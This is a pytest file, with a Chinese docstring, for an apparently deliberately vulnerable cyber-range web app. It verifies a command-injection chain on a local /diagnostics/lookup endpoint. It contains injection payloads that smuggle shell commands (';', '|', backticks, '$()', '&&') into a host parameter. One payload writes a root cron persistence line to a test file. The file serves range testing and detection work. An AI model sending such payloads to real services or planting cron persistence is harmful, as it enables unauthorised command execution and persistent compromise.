"""CH4 Ghost in the System（校園報修診斷工具，#153 Campaign Pack v1）攻擊面的真實驗證。

不是模擬：起真的 `ThreadingHTTPServer`，對 `/diagnostics/lookup` 真的用 `;` 斷句注入
任意指令，斷言只有注入才會出現的 marker 真的出現在回應裡；再用同一個注入點真的把
一行內容寫進（測試專用路徑上的）cron 檔，斷言檔案內容正確。若這條測試紅了，代表
攻擊鏈本身壞了，不是「規則寫錯」。

`TARGET_SHELL` 預設 `/bin/sh`（golden VM 上的真路徑），CI 跑在 Linux runner 上原生
存在；本機開發（Windows）用 Git Bash 的 `sh.exe` 頂替，行為對這條測試而言等價
（純粹是「把字串組進 shell -c 執行」這件事，不依賴任何 Linux-only 語法）。
"""

from __future__ import annotations

import http.client
import importlib.util
import os
import threading
import time
from http.server import ThreadingHTTPServer
from pathlib import Path
from urllib.parse import quote

import pytest

_APP_PATH = Path(__file__).resolve().parents[2] / "deploy" / "range-target" / "app.py"


def _load_app_module(tmp_path: Path):
    os.environ["TARGET_CRON_FILE"] = str(tmp_path / "campus-report")
    os.environ["TARGET_LOG_PATH"] = str(tmp_path / "app.log")
    os.environ.setdefault("TARGET_SHELL", "/bin/sh")
    spec = importlib.util.spec_from_file_location("range_target_app_ch4", _APP_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def app_module(tmp_path):
    return _load_app_module(tmp_path)


@pytest.fixture
def live_server(app_module):
    server = ThreadingHTTPServer(("127.0.0.1", 0), app_module.Handler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.1)
    try:
        yield port
    finally:
        server.shutdown()


class TestCommandInjectionClassification:
    """純函式：漏洞判定邏輯要被測試釘住（同 `_looks_like_sqli`／`_looks_like_ssrf`）。"""

    def test_plain_hostname_is_not_flagged(self, app_module):
        assert app_module._looks_like_command_injection("mit.edu") is False

    def test_semicolon_breakout_is_flagged(self, app_module):
        assert app_module._looks_like_command_injection("mit.edu; whoami") is True

    def test_pipe_breakout_is_flagged(self, app_module):
        assert app_module._looks_like_command_injection("mit.edu | whoami") is True

    def test_command_substitution_forms_are_flagged(self, app_module):
        assert app_module._looks_like_command_injection("mit.edu`whoami`") is True
        assert app_module._looks_like_command_injection("mit.edu$(whoami)") is True

    def test_boolean_chaining_is_flagged(self, app_module):
        assert app_module._looks_like_command_injection("mit.edu && whoami") is True
        assert app_module._looks_like_command_injection("mit.edu || whoami") is True


class TestDiagnosticsLookupExploitChain:
    """真 HTTP round-trip。T1059（指令注入本身）→ T1053（cron 持久化寫入）。"""

    def test_benign_lookup_just_echoes_the_host(self, live_server):
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("GET", "/diagnostics/lookup?host=mit.edu")
        resp = conn.getresponse()
        body = resp.read().decode()
        assert resp.status == 200
        assert "checking mit.edu" in body

    def test_semicolon_injection_executes_arbitrary_code(self, live_server):
        marker = "CH4_INJECTION_PROOF_7a2f"
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("GET", f"/diagnostics/lookup?host={quote(f'mit.edu; echo {marker}')}")
        resp = conn.getresponse()
        body = resp.read().decode()
        assert resp.status == 200
        assert marker in body, f"expected injection marker in output, got {body!r}"

    def test_same_injection_point_writes_cron_persistence(self, live_server, app_module):
        cron_line = "* * * * * root touch /var/lib/purplescope/campus-persist-marker"
        cron_file = os.environ["TARGET_CRON_FILE"]
        payload_host = f"mit.edu; echo '{cron_line}' > \"{cron_file}\""
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("GET", f"/diagnostics/lookup?host={quote(payload_host)}")
        resp = conn.getresponse()
        resp.read()
        assert resp.status == 200

        cron_path = Path(cron_file)
        assert cron_path.exists(), "cron persistence file was not written"
        assert cron_path.read_text().strip() == cron_line

    def test_missing_host_is_rejected(self, live_server):
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("GET", "/diagnostics/lookup")
        resp = conn.getresponse()
        assert resp.status == 400
        resp.read()
